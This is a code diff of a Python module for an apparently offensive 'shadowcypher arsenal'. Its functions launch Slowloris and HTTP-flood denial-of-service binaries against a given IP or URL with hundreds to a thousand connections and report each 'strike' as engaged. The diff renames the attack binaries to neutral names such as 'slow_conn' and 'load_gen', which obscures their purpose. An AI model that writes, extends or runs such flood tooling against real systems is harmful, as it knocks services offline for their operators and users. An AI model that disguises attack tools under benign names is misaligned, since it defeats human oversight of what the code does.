@@ -23,12 +23,12 @@ def arsenal_slowloris(target_ip: str, port: str = "80", connections: int = 1000)
         port: The target port (default 80).
         connections: Number of concurrent connections (default 1000).
     """
-    binary = platform_engine.resolve_path("shadowcypher", "arsenal", "primitives", "slowloris", "slowloris")
+    binary = platform_engine.resolve_path("shadowcypher", "arsenal", "primitives", "slow_conn", "slow_conn")
     if not os.path.exists(binary):
         return f"FATAL_ERROR: Slowloris binary missing at {binary}. Run 'shadowcypher_launch' to compile."
 
     try:
-        cmd = [binary, target_ip, str(port), str(connections)]
+        cmd = [binary, target_ip, port, str(connections)]
         task_id = runner.execute_task(f"SLOW_{target_ip}", cmd)
         logger.info("arsenal", f"STRIKE_ENGAGED: Slowloris targeting {target_ip}:{port} (Task: {task_id})")
         return f"SUCCESS: Slowloris strike initiated against {target_ip}:{port} with {connections} threads. Task ID: {task_id}"
@@ -43,7 +43,7 @@ def arsenal_http_flood(url: str, concurrency: int = 500) -> str:
         url: The target URL.
         concurrency: Number of workers (default 500).
     """
-    binary = platform_engine.resolve_path("shadowcypher", "arsenal", "primitives", "http_flood", "http_flood")
+    binary = platform_engine.resolve_path("shadowcypher", "arsenal", "primitives", "load_gen", "load_gen")
     if not os.path.exists(binary):
         return f"FATAL_ERROR: HTTP_Flood binary missing at {binary}. Run 'shadowcypher_launch' to compile."
 
